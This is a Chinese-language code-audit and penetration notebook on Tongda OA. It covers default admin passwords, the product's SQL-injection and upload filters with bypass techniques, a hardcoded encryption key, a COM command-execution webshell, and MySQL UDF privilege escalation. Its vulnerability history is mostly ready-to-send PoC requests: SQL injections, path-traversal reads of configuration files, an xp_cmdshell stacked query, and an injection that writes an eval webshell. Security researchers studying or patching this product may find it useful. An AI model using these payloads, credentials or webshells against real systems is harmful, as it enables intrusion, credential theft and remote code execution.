# 通达OA

## 环境配置

### 下载安装

v12版：https://cdndown.tongda2000.com/oa/2022/TDOA12.0.exe

v11版（11.2-11.10）：TDOA+版本名.exe。比如下载11.9本，则名为`TDOA11.9.exe`，对应的下载链接为：https://cdndown.tongda2000.com/oa/2019/TDOA11.10.exe

2013-2017版：旧版本，MYOA+年份.exe。比如下载2015版本，则名为`/oa/2015/MYOA2015.exe`，对应的下载链接为：https://cdndown.tongda2000.com/oa/2017/MYOA2017.exe

环境安装为一体安装包，直接双击点exe，设定完安装目录安装（例如C:\TongDa）即可自动安装。源码在web根目录（webroot）。代码同样是使用php Zend 5.x进行加密的，所以可以使用SeayDzend工具或者百度php zend解密在线网站进行解密。

版本查询
```
inc/expired.php
inc/version.inc.php
inc/reg_trial.php
inc/reg_trial_submit.php
```

### 账户密码 
```
# 后台账户
admin 密码默认为空 (不会强制修改密码；密码限制长度8-20位，必须同时包含字母和数字)

# 扩展用户
officeTask 默认密码为空

# 服务账户
查看\bin\Service.ini文件

# 默认超级密码
v11版: 空
2013-2017版: t.KNnZ13xCrRI
```

## 架构分析

通达OA采用了yii2框架，并加入自主开发的系统。安装目录如下，官方文档中声明了`/webroot/general/`是主要功能模块，子文件夹appbuilder就是用的yii框架。但其他功能没有在yii框架范围内。所以路由分为（1）文件到根目录的相对路径 （2）yii框架对应的`/general/appbuilder/web/模块名/控制器名/方法名`
```
｜—attach （存放附件）
｜—bin （PHP、Zeng等配置）
｜—data5 （mysql数据库文件）
｜—logs （日志文件）
｜—MyAdmin （mysql管理工具）
｜—mysql5 （mysql主程序文件）
｜—nginx （Nginx Web应用服务）
｜—tmp （临时文件）
｜—webroot （Web根目录）
    ｜—general 主要模块
        ｜—appbuilder yii框架
        ｜—system 系统功能模块
    ｜—inc 系统通用程序及函数目录
    ｜—ispirit OA精灵页面
    ｜—mobile OA移动界面
    ｜—module 系统组件
    ｜—portal 门户界面
```

查看`/general/appbuilder/config/web.php`，即yii的路由配置。可以看到（1）开启了美化路由，并且设置不显示index.php，但是没设置美化规则
```php
"urlManager"   => array(
	"enablePrettyUrl" => true,
	"showScriptName"  => false,
	"rules"           => array()
	),
```



1. `/general/appbuilder/web/模块名/控制器名/方法名`

   appbuilder为yii2框架的目录，该路由访问的是yii2自定义模块的目录。由于开启urlManageer美化url设置，所以访问自定义模块的时候不带入口文件：
   
   ```php
   "urlManager"   => array(
   			"enablePrettyUrl" => true,
   			"showScriptName"  => false,
   			"rules"           => array()
   			),
   ```
   
2. 前台、后台模块筛选：

   将$b_dir_priv直接设置为true部分可以免登录直接访问，在`general/appbuilder/config/params.php`中默认的有skip_module不用进行校验：

​		`"skip_module" => array()"portal", "hr", "meeting", "formCenter", "calendar", "officeproduct", "invoice")`

​		同理可知， 这三个模块下必须经过权限校验才能访问。

​		`"check_module" => array("appcenter", "report", "appdesign")`


访问路由时，查找不包含权限校验文件的（如下），优先进行代码审计
```
pda/auth.php
pda/pad/auth.php
task/auth.php
mobile/auth_mobi.php
mobile/auth.php
general/data_center/utils/task_auth.php
general/reportshop/utils/task_auth.php
interface/auth.php
ispirit/im/auth.php
```

### (5) 安全策略 ###

- sql注入防护：sql_injection

引用的80sec的sql注入通用ids防御程序，然后在不同版本中进行了不同程度的修改，这里放11.10版本的：

```php
function sql_injection($db_string)
{
	$clean = "";
	$error = "";
	$old_pos = 0;
	$pos = -1;
	$db_string = str_replace(array("''", "\'"), "", $db_string);
	$db_string = preg_replace("/`[^,=\(\)]*'[^,=\(\)]*`/", "", $db_string);

	while (true) {//绕过思路1:两个单引号之间的内容替换成\$s\$
		$pos = strpos($db_string, "'", $pos + 1);

		if ($pos === false) {
			break;
		}

		$clean .= substr($db_string, $old_pos, $pos - $old_pos);

		while (true) {
			$pos1 = strpos($db_string, "'", $pos + 1);
			$pos2 = strpos($db_string, "\\", $pos + 1);

			if ($pos1 === false) {
				break;
			}
			else {
				if (($pos2 == false) || ($pos1 < $pos2)) {
					$pos = $pos1;
					break;
				}
			}

			$pos = $pos2 + 1;
		}

		$clean .= "\$s\$";
		$old_pos = $pos + 1;
	}

	$clean .= substr($db_string, $old_pos);
	$clean = trim(strtolower(preg_replace(array("/\s+/s"), array(" "), $clean)));
	$fail = false;
	$matches = array();
	if ((2 < strpos($clean, "/*")) || (strpos($clean, "--") !== false) || (strpos($clean, "#") !== false)) {
		$fail = true;
		$error = _("注释代码");
	}
	else if (preg_match("/(^|[^a-z])union(\s+[a-z]*)*\s+select($|[^[a-z])/s", $clean) != 0) {
		$fail = true;
		$error = _("联合查询");
	}
	else if (preg_match("/(^|[^a-z])(sleep|benchmark|load_file|mid|ord|ascii|extractvalue|updatexml|exp|current_user)\s*\(/s", $clean, $matches) != 0) {
		$fail = true;
		$error = $matches[2];
	}
	else if (preg_match("/(^|[^a-z])into\s+outfile($|[^[a-z])/s", $clean) != 0) {
		$fail = true;
		$error = _("生成文件");
	}
	else if (preg_match("/.*update.+user.+set.+file_priv.*/s", $clean) != 0) {
		$fail = true;
		$error = "set file_priv";
	}
	else if (preg_match("/.*set.+general_log.*/s", $clean) != 0) {
		$fail = true;
		$error = "general_log";
	}

	if ($fail) {
		echo _("不安全的SQL语句：") . $error . "<br />";
		echo td_htmlspecialchars($db_string);
		exit();
	}
}
```

绕过方式：

（1）引入单引号绕过：

上述代码中while部分循环表示两个单引号之间的内容替换成\$s\$，然后拼接到$clean（一开始会截取第一个单引号之前的sql语句部分），处理完的$clean之后再进行各类if分支判断

**【<=11.9】法1：@+反引号包裹**

直接写单引号会被转义，使用@\`'\`方式绕过转义，此时该值为null。如果是sql表不允许某个字段为null，规避这个情况需要通过来char(@\`'\`)绕过。

**法2：两个@符号包裹**

`@'@`

**法3：双引号包裹**

`"'"`

**法4：反引号拼接**

```
`'`.``.后续sql语句
```

以TD_OA数据库user表为例，表结构中字段user_name为中文账户名，user_id为用户名，uid为用户id编号。

```
use TD_OA;
select * from user where user_name='a' and `'`.``.uid or if(substr((select user_id from user where uid = 1),1,1)='a',sleep(5),0)#';
```

![img](https://cdn.nlark.com/yuque/0/2022/png/21861937/1661428813331-29766064-b4e8-4cde-85f0-0b32666d9820.png)

该sql语句优先级等同于：

```
select * from user where user_name='a' and (`'`.``.uid or (if(substr((select user_id from user where uid = 1),1,1)='a',sleep(5),0)))#';
```

（2）盲注绕过

在11.9版本的通达中已经对响应的绕过方式进行了修复，首先会把所有转义之后的引号替换为空，然后再把反引号中的引号替换为空（见代码注释）。

同时对报错注入方式的常见函数过滤了，但是没有处理盲注，其中延时注入可以通过笛卡尔注入方式，逻辑盲注也没有过滤（根据页面情况响应来判断）

（3）编码绕过

hex编码和url编码，e.g.

```
select * from user where id = 1 and (select name from by_user where uid=1) like 0x25
```

- 上传防护：is_uploadable

  inc/utility_file.php::is_uploadable()是针对上传文件中的文件检测的函数，这里放11.10版本的代码：

```php
function is_uploadable($FILE_NAME)
{
  $POS = strrpos($FILE_NAME, ".");
  
  if ($POS === false) {
    $EXT_NAME = $FILE_NAME;
  }
  else {
    if (strtolower(substr($FILE_NAME, $POS + 1, 3)) == "php") {
      return false;
    }
    //“a.php”的“.php”进行检测，既然定位是.只要.后面不是php即可绕过，即：“a.php.”可以绕过
    $EXT_NAME = strtolower(substr($FILE_NAME, $POS + 1));
  }
....
```

（1）绕过方式：

1. 点绕过
2. 特殊acsii码绕过：0x88
3. 包含指定目录的文件（vuln-history sql注入修改文件路径进行包含的漏洞）
4. 因为环境是一体的，nginx的nginx.conf配置文件设定对所有的上传目录attachment等目录下上传的可执行脚本文件类型不允许有执行权限，所以**配合目录穿越上传可执行文件到其他目录下才能让php文件执行**

```nginx
 location ~* ^/(attachment|static|images|theme|templates|wav|mysql|resque|task)/.*\.(php|.php3|.php5|jsp|asp)$ {
            deny all;
        }
```

（2）禁止上传文件类型：

```
$UPLOAD_FORBIDDEN_TYPE = "php,php3,php4,php5,phpt,jsp,asp,aspx,";
$UPLOAD_LIMIT_TYPE = "php,php3,php4,php5,";
```

- td_authcode函数

inc/utility_all.php::td_authcode()是系统自己开发的编码函数，使用量也不少，这里放11.10版本的：

```php
function td_authcode($string, $operation, $key, $expiry)
{
	$ckey_length = 4;
	$key = md5($key ? $key : "53c1fb88217737c98daf47e664f3180e");
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = ($ckey_length ?
		($operation == "DECODE" ? substr($string, 0, $ckey_length) :
			substr(md5(microtime()), -$ckey_length)) : "");
	$cryptkey = $keya . md5($keya . $keyc);
	$key_length = strlen($cryptkey);
	$string = ($operation == "DECODE" ?
		base64_decode(substr($string, $ckey_length)) :
		sprintf("%010d", $expiry ?
			$expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string);
	$string_length = strlen($string);
	$result = "";
	$box = range(0, 255);
	$rndkey = array();

	for ($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for ($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for ($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ $box[($box[$a] + $box[$j]) % 256]);
	}

	if ($operation == "DECODE") {
		if (((substr($result, 0, 10) == 0) || (0 < (substr($result, 0, 10) - time()))) && (substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16))) {
			return substr($result, 26);
		}
		else {
			return "";
		}
	}
	else {
		return $keyc . str_replace("=", "", base64_encode($result));
	}
}
```

td_authcode只处理解码参数的识别，td_authcode($key,$operation...) 中$operation只判断是否为DECODE

默认使用固定的key，且该key硬编码“53c1fb88217737c98daf47e664f3180e”。

- disable_function危险函数限制	

安装环境是一体环境，系统的php配置都是统一的。但对php的配置也是不同版本下不同的，所有配置都设置了disable_function限制，这里放两个系列版本下的默认设置：

```ini
# 11.10
disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo,popen,dl,eval,proc_terminate,touch,escapeshellcmd,escapeshellarg

# 2015 未限制eval
disable_functions = exec,shell_exec,system,passthru,proc_open,show_source,phpinfo
```

1. 黑名单绕过：

v11.10限制了大部分危险函数，一句话木马写shell受限，但没限制的可执行函数：`assert`（不能通过这个一句话来执行系统命令）

2015版基本没有限制eval函数

2. Windows 系统组件 COM上传图片马

11.9版本已经不支持了，使用条件：

（1）com.allow_dcom = true（默认不开启）

（2）开启php_com_dotnet.dll

（3）php>5.4

```php
<?php
  $command = $_POST['pass'];
  $wsh = new COM('WScript.shell');
  $exec = $wsh->exec("cmd/c".$command);
  $stdout = $exec->StdOut();
  $stroutput = $stdout->ReadAll();
  echo $stroutput;
```

3. mysql udf提权

通达sql注入比较多，通过sql注入getshell后没法执行命令，但是sql注入可操纵的数据库用户权限很高，不是root就是oa用户（oa比root没有grant权限）。

（1）利用条件：

mysql可远程登录；

CREATE权限、FILE权限（root用户默认拥有所有权限）；

secure_file_priv项设置为空（不是null）:

e.g.

`general/hr/manage/query/delete_result.php` SQL注入可以创建高权限的数据库用户，利用新创建的用户修改该配置

（2）操作步骤：

- 查看用户权限
- 查看secure_file_priv配置

mysql5.1以上使用plugins目录上传udf，通达mysql5默认设置有plugins，使用`show variables like ‘plugins%';`即可查看路径。利用使用sqlmap/msf工具自带so或dll格式udf文件上传，具体操作步骤可参考：

https://www.freebuf.com/articles/database/291175.html

### (6) 补丁 ###

补丁分为日常离线补丁包和紧急补丁包，后者在出了新版本之后不再上架

离线补丁包：https://www.tongda2000.com/download/pXXXpatch.php

紧急补丁：https://www.tongda2000.com/download/patchXXX.php

XXX为各系列、版本发布年份，e.g. v11系列最早发布于2019年，即修改为patch2019.php或p2019patch.php

紧急补丁区别于离线补丁包在于打了紧急补丁的系统，版本号不会改变，且只存在于每个大版本之间。

### (7) 历史漏洞 ###

- SQL注入

```
(1)【<=11.6】/general/bi_design/appcenter/report_bi.func.php 登陆后联合注入
POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
_POST[dataset_id]=efgh'-@`'`)union+select+database(),2,user()#'&action=get_link_info

（2）【<=11.6】/general/bi_design/appcenter/report_bi.func.php 登陆后联合注入
POST /general/bi_design/appcenter/report_bi.func.php HTTP/1.1
_POST[dataset_id]=efgh'-@`'`)union+select+database(),2,user()#'&action=get_link_info

（3）【<=11.6】general/document/index.php/recv/register/insert 逻辑盲注
POST /general/document/index.php/recv/register/insert  
title)values("'"^exp(if(1%3d2,1,710)))#=1&_SERVER

（4）【<=11.5】general/file_folder/swfupload_new.php 未授权逻辑盲注
POST /general/file_folder/swfupload_new.php
SORT_ID=0 RLIKE (SELECT  (CASE WHEN (substr(user(),1,1)=0x72) THEN 1 ELSE 0x28 END))

（5）【<=11.7】/general/email/inbox/get_index_data.php 逻辑盲注
GET /general/email/inbox/get_index_data.php?timestamp=&curnum=0&pagelimit=10&total=&boxid=0&orderby=3 RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END))

（6）【2011-2013】general/crm/studio/modules/EntityRelease/release.php 逻辑盲注可导致代码注入
GET /general/crm/studio/modules/EntityRelease/release.php?entity_name=1%d5'%20or%20sys_function.FUNC_ID=1%23%20${%20fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz5vaw))}

（7）【<=11.10】general/hr/manage/query/delete_cascade.php 任意sql语句注入
REF：https://www.77169.net/html/267833.html
11.10版修补不完全，可绕过patch

（8）【<=11.7】interface/go.php floor报错注入
urlencode绕过注入检测
REF：https://f5.pm/go-45052.html#:~:text=urldecode%E5%88%A9%E7%94%A8%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4SQL%E6%B3%A8%E5%85%A5

（9）【<=2014】/inc/finger/use_finger.php extractvalue报错
POC:
GET /inc/finger/use_finger.php?USER_ID=-1%df%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(123456))))%23

(10)【<=2014】/general/ems/query/search_excel.php extractvalue报错
POC：
GET /general/ems/query/search_excel.php?LOGIN_USER_ID=1%bf%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(123456))))%23 
GET /general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df'and%20extractvalue(1,%20concat(0x5c,(select%20MD5(123456))))%23

(11)【<=11.6】/pda/reportshop/record_detail.php 延时注入
注入点有repid和mr_id两个，POC：
注入点=1%20and%20(substr(database(),1,1))=char(116)%20and%20(select%20count(*)%20FROM%20information_schema.columns%20A,information_schema.columns%20B)

（12）【<=11.10】/general/system/approve_center/flow_data/export_data.php 延时注入
REF：https://www.yulate.com/303.html

# yii2 框架注入
（13）【<=11.5】RepdetailController.php 延时注入
GET /general/appbuilder/web/report/repdetail/edit?link_type=false&slot={}&id=2 OR (SELECT 4201 FROM (SELECT(SLEEP(5)))birR)

（14）【<=11.5】Calendar.php的getcallist 逻辑盲注
POST /general/appbuilder/web/calendar/calendarlist/getcallist HTTP/1.1
starttime=1') AND (SELECT 8771 FROM (SELECT(SLEEP(5)))xrUG) AND ('CsEA'='CsEA&endtime=1598918400&view=month&condition=1

（15）【<=11.9】general/appbuilder/modules/portal/controllers/WorkbenchController.php 逻辑盲注/延时注入
REF：http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20upsharestatus%20%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html

（16）【<=11.7】/general/appbuilder/web/officeproduct/productapply/applyprobygroup 延时注入
POST /general/appbuilder/web/officeproduct/productapply/applyprobygroup HTTP 1.1
arr[5][pro_id]=151';select sleep(5) %23

（17）【2015】/general/document/index.php/send/approve/finish 延时注入
POST /general/document/index.php/send/approve/finish
sid=1) and char(@`'`)  union select if(ord(mid(PASSWORD,33,1))=%d,sleep(8),1),1 from user WHERE BYNAME = 0x61646d696e #and char(@`'`)

（18）【<=11.5】/general/appbuilder/web/meeting/meetingmanagement/meetingreceipt 堆叠
POST /general/appbuilder/web/meeting/meetingmanagement/meetingreceipt HTTP/1.1
m_id=5&join_flag=2&remark='%3b%20exec%20master%2e%2exp_cmdshell%20'ping%20172%2e10%2e1%2e255'--
```

- 文件操作

```
(1)【<=11.3】module/upload/upload.php 文件上传
2017版漏洞分析和复现ref：
https://cloud.tencent.com/developer/article/1856837

（2）【2015】前台变量覆盖+SQL注入+文件上传+文件包含getshell
REF：https://www.cnblogs.com/iamstudy/articles/tongdaoa_2015_sql_getshell.html
其中上传点general/reportshop/utils/upload.php在2015修复后在v11.7发现仍然bypass可利用，该功能点分别能造成上传、包含和删除的漏洞影响。
general/reportshop/utils/upload.php?action=upload 文件上传
general/reportshop/utils/upload.php?action=upload&filetype=xls 文件包含
general/reportshop/utils/upload.php?action=upload&filetype=img或attach 文件删除

（3）【<=11.9】/general/netdisk/upload.php 文件上传
REF：https://www.secpulse.com/archives/184090.html

（4）【<=11.8】mobile/api/api.ali.php 文件上传
REF：http://wiki.peiqi.tech/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.8%20api.ali.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html

（5）【<=11.8】general/hr/manage/staff_info/update.php 文件包含	
REF：https://paper.seebug.org/1499/#getshell

（6）【<=11.9】inc/package/down.php 未授权数据库备份文件下载
GET /inc/package/down.php?id=.<>./.<>./.<>./.<>./bak/TD_OA/文件名
前提：提前用户有对数据库进行备份、备份文件名

（7）【2017旧版以前】/general/approve_center/archive/exportLog.php 未授权文件下载
GET /general/approve_center/archive/exportLog.php?filePath=.<>./.%00./../../webroot/inc/common.inc.php

（8）【2017旧版以前】/module/AIP/get_file.php 未授权文件下载
GET /module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php

（9）【2011】general/crm/apps/crm/include/import/export.php 未授权文件下载
GET general/crm/apps/crm/include/import/export.php?errorReportPath=../../../../webroot/inc/oa_config
REF：http://www.wenqujingdian.com/Public/editor/attached/file/20180324/20180324174546_56538.pdf

（10）【ueditor编辑器】/module/ueditor/php/action_upload.php 未授权上传
利用ueditor 1.3.6版本第三方编辑器插件上传漏洞造成的影响：https://www.cnblogs.com/4thrun/p/15807017.html#:~:text=%3C/html%3E-,0x02%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0,-%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80%EF%BC%9A.net

（11）【<=11.6】module\appbuilder\assets\print.php 文件删除
GET /module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php

（12）【<=11.3】ispirit/im/upload.php 未授权文件上传
REF：
https://www.cnblogs.com/yuzly/p/13607055.html

（13）【<=11.7】/ispirit/im/photo.php 登录绕过+任意文件读取+ssrf
REF：https://www.hacking8.com/bug-web/%E9%80%9A%E8%BE%BEoa/%E9%80%9A%E8%BE%BEOA11.7%E7%BB%84%E5%90%88%E6%8B%B3RCE%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90.html#:~:text=a%7D_.txt-,%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB,-/ispirit/interface/gateway
组合拳利用链条1

（14）【<=11.7?】/general/file_folder/new/submit.php 登陆绕过+文件上传
REF：https://forum.90sec.com/t/topic/1589

（15）【<=11.6】/general/data_center/utils/upload.php 文件上传（结合漏洞11未授权RCE）
REF:https://xz.aliyun.com/t/8430
POC.py: https://github.com/TomAPU/poc_and_exp/blob/master/rce.py

（16）/general/mytable/intel_view/video_file.php 文件下载
POC:
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php  

（17）【<=11.3】/ispirit/interface/gateway.php 文件包含
- 不同版本位置不同：
<11.3、2013:ispirit/interface/gateway.php
2017：/mac/gateway.php
- POC:
POST /xxx/gateway.php HTTP/1.1
# poc1
json={"url":"/general/../../attach/im/xxx/xxx.php"} #POC1
# poc2
json={这里面只要不是url的变量赋值或者为空就行}&url=/general/.<>./.<>./attach/im/xxx/xxx.php 
# poc 3
Cookie：json%00aa={"url":"xxx"}
# poc 4
TD_HTML_EDITOR_json={"url":"/general/../../nginx/logs/oa.access.log"}

（18）【<=11.5】general/file_folder/swfupload.php 未授权文件上传
REF：https://xz.aliyun.com/t/7446#toc-3

（19）【<=11.3】inc/second_tabs.php 本地文件包含伪造menu_top.php文件
REF：https://www.secpulse.com/archives/139046.html

（20）【<=11.3】mobile/reportshop/report/getdata.php 上传
REF：https://www.secpulse.com/archives/139046.html
```

- 权限绕过

```
（1）【<=11.7】/mobile/auth_mobi.php 在线任意用户登录
REF：https://www.o2oxy.cn/3158.html

（2）【<=11.5】【2017】/general/logincheck_code.php 任意登陆
REF：https://l3yx.github.io/2020/04/27/%E9%80%9A%E8%BE%BEOA-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90

（3）【<=11.10】login.php/logincheck.php 用户名和密码爆破+netdisk上传getshell
REF：https://www.freebuf.com/articles/network/340612.html
```

- 其他

```
（1）【<=11.7】/pda/workflow/img_download.php SSRF
REF：https://mp.weixin.qq.com/s/6qxSzypbmtvG6HLSHZ-vZg
```
